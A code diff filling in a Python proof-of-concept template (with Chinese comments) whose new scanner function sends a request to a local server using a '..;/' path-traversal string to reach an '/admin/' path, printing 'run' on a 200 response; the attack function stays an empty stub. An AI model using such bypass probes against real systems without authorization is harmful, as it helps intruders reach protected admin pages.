@@ -1,3 +1,6 @@
+import requests
+from lib import config
+
 class POC:
     #PoC信息字段，需要完整填写全部下列信息
     version = '1'#PoC版本，默认为1
@@ -14,7 +17,12 @@ class POC:
     pocDesc = '''PoC用法描述'''#在PoC用法描述填写
 
     def scanner():
+        head = config.Pack
+        url = 'http://127.0.0.1:8080/xxx/..;/admin/'
+        response = requests.get(url,headers=head)
+        if response.status_code == 200:
+            print('run')
         return
 
     def attack():
-        return
+        return 0
